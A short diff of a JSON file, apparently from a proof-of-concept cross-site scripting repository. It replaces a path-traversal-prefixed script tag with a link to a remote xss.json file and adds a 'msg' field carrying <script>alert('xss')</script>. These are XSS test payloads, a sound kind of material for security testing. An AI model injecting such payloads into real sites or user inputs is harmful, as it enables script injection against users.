@@ -1,3 +1,4 @@
 {
-    "url": "../<script>alert('xss')</script>",
+    "url": "https://raw.githubusercontent.com/zprytka/PoCXss/main/xss.json",
+    "msg": "<script>alert('xss')</script>"
 }
